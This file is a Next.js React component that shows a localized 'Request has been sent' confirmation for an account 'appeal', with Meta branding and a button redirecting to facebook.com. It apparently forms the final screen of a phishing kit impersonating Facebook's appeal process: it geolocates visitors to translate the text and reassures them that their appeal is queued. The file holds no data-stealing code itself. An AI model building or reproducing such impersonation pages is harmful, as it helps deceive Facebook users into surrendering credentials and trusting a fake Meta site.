import FinalImage from '@/assets/images/final-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const FinalModal: FC = () => {
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo } = store();
    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        (async () => {
            // Map country code to language code for translation (comprehensive mapping)
            const countryToLang: Record<string, string> = {
                // English
                'us': 'en', 'gb': 'en', 'au': 'en', 'ca': 'en', 'nz': 'en', 'ie': 'en',
                'sg': 'en', 'hk': 'en', 'za': 'en', 'ng': 'en', 'ke': 'en', 'gh': 'en',
                // Vietnamese
                'vn': 'vi',
                // Arabic
                'ae': 'ar', 'sa': 'ar', 'eg': 'ar', 'jo': 'ar', 'lb': 'ar', 'om': 'ar',
                'qa': 'ar', 'kw': 'ar', 'bh': 'ar', 'iq': 'ar', 'ye': 'ar', 'ps': 'ar',
                'tn': 'ar', 'ma': 'ar', 'dz': 'ar', 'ly': 'ar', 'sd': 'ar', 'mr': 'ar',
                // German
                'de': 'de', 'at': 'de', 'ch': 'de', 'lu': 'de',
                // Dutch
                'nl': 'nl', 'be': 'nl',
                // Bulgarian
                'bg': 'bg',
                // Portuguese
                'pt': 'pt', 'br': 'pt', 'ao': 'pt', 'mz': 'pt', 'cv': 'pt', 'gw': 'pt', 'st': 'pt',
                // Spanish
                'es': 'es', 'mx': 'es', 'ar': 'es', 'co': 'es', 'pe': 'es', 've': 'es',
                'cl': 'es', 'ec': 'es', 'bo': 'es', 'py': 'es', 'uy': 'es', 'cr': 'es',
                'pa': 'es', 'sv': 'es', 'hn': 'es', 'ni': 'es', 'gt': 'es', 'do': 'es', 'cu': 'es',
                // Finnish
                'fi': 'fi',
                // French
                'fr': 'fr', 'sn': 'fr', 'ci': 'fr', 'bj': 'fr',
                'bf': 'fr', 'ga': 'fr', 'gn': 'fr', 'cm': 'fr', 'cg': 'fr', 'ne': 'fr',
                'tg': 'fr', 'ml': 'fr', 'cd': 'fr', 'cf': 'fr', 'dj': 'fr', 'sc': 'fr',
                'bl': 'fr', 'gp': 'fr', 'mq': 'fr', 're': 'fr', 'mu': 'fr', 'ht': 'fr',
                // Greek
                'gr': 'el', 'cy': 'el',
                // Croatian
                'hr': 'hr',
                // Hungarian
                'hu': 'hu',
                // Hindi
                'in': 'hi',
                // Italian
                'it': 'it', 'sm': 'it', 'va': 'it',
                // Lithuanian
                'lt': 'lt',
                // Latvian
                'lv': 'lv',
                // Maltese
                'mt': 'mt',
                // Malay
                'my': 'ms',
                // Norwegian
                'no': 'no',
                // Polish
                'pl': 'pl',
                // Romanian
                'ro': 'ro', 'md': 'ro',
                // Swedish
                'se': 'sv', 'ax': 'sv',
                // Slovenian
                'si': 'sl',
                // Slovak
                'sk': 'sk',
                // Thai
                'th': 'th',
                // Turkish
                'tr': 'tr',
                // Chinese
                'cn': 'zh', 'tw': 'zh', 'mo': 'zh',
                // Korean
                'kr': 'ko',
                // Czech
                'cz': 'cs',
                // Danish
                'dk': 'da', 'gl': 'da',
                // Estonian
                'ee': 'et',
                // Filipino
                'ph': 'tl',
                // Russian
                'ru': 'ru',
                // Japanese
                'jp': 'ja',
                // Bengali
                'bd': 'bn',
                // Urdu
                'pk': 'ur',
                // Ukrainian
                'ua': 'uk',
                // Indonesian
                'id': 'id',
                // Persian (Farsi)
                'ir': 'fa',
                // Burmese
                'mm': 'my',
                // Swahili
                'tz': 'sw'
            };

            const targetLang = countryToLang[geoInfo.country_code.toLowerCase()] || 'en';
            const translationsData = getTranslations(targetLang);
            setTranslations(translationsData);
        })();
    }, [geoInfo]);

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-2 md:px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xs md:max-w-xl flex-col gap-5 md:gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-2 md:p-4'>
                <p className='mt-4 text-lg md:text-2xl font-bold'>{t('Request has been sent')}</p>
                <p className='text-base md:text-xl'>{t('Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.')}</p>
                <div className='flex flex-col justify-center gap-10'>
                    <Image src={FinalImage} alt='' />
                    <button type='button' onClick={() => window.location.replace('https://www.facebook.com')} className='mt-4 flex h-[45px] md:h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 text-sm md:text-base'>
                        {t('Return on Facebook')}
                    </button>
                </div>
                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default FinalModal;
